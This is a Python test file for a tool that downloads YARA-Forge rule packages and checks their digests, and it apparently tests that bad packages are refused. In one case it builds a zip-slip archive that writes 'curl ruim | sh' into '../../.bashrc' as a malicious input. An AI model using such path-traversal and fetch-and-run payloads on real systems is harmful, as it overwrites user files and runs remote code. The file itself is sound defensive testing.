import hashlib
import io
import json
import zipfile

import pytest

from guardiao import bases
from guardiao.fontes import yara_forge

pytest.importorskip("yara_x")

REGRAS = "\n".join(f'rule R{i} {{ meta: score = 75 strings: $a = "marca{i}" condition: $a }}' for i in range(1200))


def zip_com(membros: dict[str, str]) -> bytes:
    dados = io.BytesIO()
    with zipfile.ZipFile(dados, "w") as z:
        for nome, texto in membros.items():
            z.writestr(nome, texto)
    return dados.getvalue()


@pytest.fixture
def github(monkeypatch):
    """Finge a API do GitHub e o download do pacote."""
    estado = {"tag": "20261103", "pacote": zip_com({yara_forge.MEMBRO: REGRAS}), "digest": None}

    def baixar(url, destino, cabecalhos=None, limite=0):
        if url == yara_forge.API:
            digest = estado["digest"] or hashlib.sha256(estado["pacote"]).hexdigest()
            corpo = json.dumps({"tag_name": estado["tag"], "assets": [
                {"name": yara_forge.PACOTE, "browser_download_url": "https://exemplo/pacote.zip",
                 "digest": f"sha256:{digest}"}]}).encode()
        else:
            corpo = estado["pacote"]
        destino.write_bytes(corpo)
        return hashlib.sha256(corpo).hexdigest()

    monkeypatch.setattr(yara_forge, "baixar_arquivo", baixar)
    return estado


def test_baixa_valida_e_instala(github):
    [r] = bases.atualizar([yara_forge.YaraForge()], agora=1000)
    assert r.situacao == "atualizada" and r.estado.versao == "20261103"
    pasta = bases.atual("yara-forge")
    assert sorted(p.name for p in pasta.iterdir()) == ["regras.yar"]   # sem sobras do download


def test_mesma_release_nao_baixa_de_novo(github):
    base = yara_forge.YaraForge()
    bases.atualizar([base], agora=1000)
    github["pacote"] = b"nem devia ser lido"
    assert bases.atualizar([base], agora=1000 + 2 * 86400)[0].situacao == "sem novidades"


@pytest.mark.parametrize("estrago", ["digest", "zip_malicioso", "poucas_regras", "nao_compila"])
def test_pacote_ruim_e_recusado(github, estrago):
    if estrago == "digest":
        github["digest"] = "0" * 64   # chegou algo diferente do que o GitHub publicou
    elif estrago == "zip_malicioso":
        github["pacote"] = zip_com({"../../.bashrc": "curl ruim | sh"})
    elif estrago == "poucas_regras":
        github["pacote"] = zip_com({yara_forge.MEMBRO: "rule So_Uma { condition: false }"})
    else:
        github["pacote"] = zip_com({yara_forge.MEMBRO: REGRAS + "\nrule { quebrada"})
    [r] = bases.atualizar([yara_forge.YaraForge()], agora=1000)
    assert r.situacao == "erro" and bases.atual("yara-forge") is None

